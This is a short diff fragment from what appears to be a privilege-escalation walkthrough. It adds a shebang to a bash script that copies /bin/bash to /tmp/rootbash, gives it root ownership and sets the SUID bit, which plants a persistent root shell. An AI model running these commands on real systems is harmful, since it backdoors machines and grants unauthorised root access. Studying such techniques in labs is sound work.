@@ -30,6 +30,7 @@ root@xxx$
 Remember to make it executable using `chmod +x root.sh`.
 
 ```bash!
+#!/usr/bin/env /bin/bash
 cp /bin/bash /tmp/rootbash
 chown root /tmp/rootbash
 chmod +s /tmp/rootbash
